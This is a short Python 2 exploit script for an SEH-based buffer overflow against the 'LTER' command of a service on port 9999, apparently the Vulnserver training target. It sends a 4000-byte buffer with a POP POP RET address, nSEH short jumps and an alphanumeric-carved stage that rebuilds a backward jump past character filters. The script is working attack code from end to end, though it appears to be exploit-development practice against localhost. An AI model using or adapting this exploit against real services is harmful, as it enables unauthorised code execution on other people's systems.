import socket
import struct
import os
import sys

vuln_command = "LTER _.?"
crash = 4000
offset = 3520
seh = struct.pack("<I", 0x6250120b)    # POP POP RET

# 1st Stage Shellcode (Short JMP - nSEH)
stage1 = ""
stage1 += "\x75\x08"              # JNZ SHORT [+0x10] = Jump if ZF is not 0
stage1 += "\x74\x06"              # JZ SHORT [+0x8] = Jump if ZF is 0

# 2nd Stage Shellcode (Short JMP - Encoded \xEB\x80)
stage2 = ""
stage2 += "\x54"                  # PUSH ESP 
stage2 += "\x58"                  # POP EAX
stage2 += "\x66\x05\x59\x13"      # ADD AX,0x1359 (018BFFFD - 016EECA4 = 0x1359)
stage2 += "\x50"                  # PUSH EAX
stage2 += "\x5C"                  # POP ESP
stage2 += "\x25\x4A\x4D\x4E\x55"  # Zero out EAX
stage2 += "\x25\x35\x32\x31\x2A"  # 
stage2 += "\x2D\x7F\x7F\x7F\x7F"  # Carving \xEB\x80\x90\x90 
stage2 += "\x2D\x7F\x7F\x7F\x7F"  # 
stage2 += "\x2D\x02\x50\x50\x50"  # 
stage2 += "\x2D\x15\x30\x20\x20"  # 
stage2 += "\x50"                  # PUSH EAX

payload = ""
payload += vuln_command
payload += "A" * (offset - len(stage1))
payload += stage1
payload += seh
payload += "C" * 2
payload += stage2
payload += "C" * (crash - 4 - offset - 2 - len(stage2))

print "[+] Sending buffer (Size: %d)" % len(payload)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 9999))
print(s.recv(1024))
s.send(payload)
s.close()

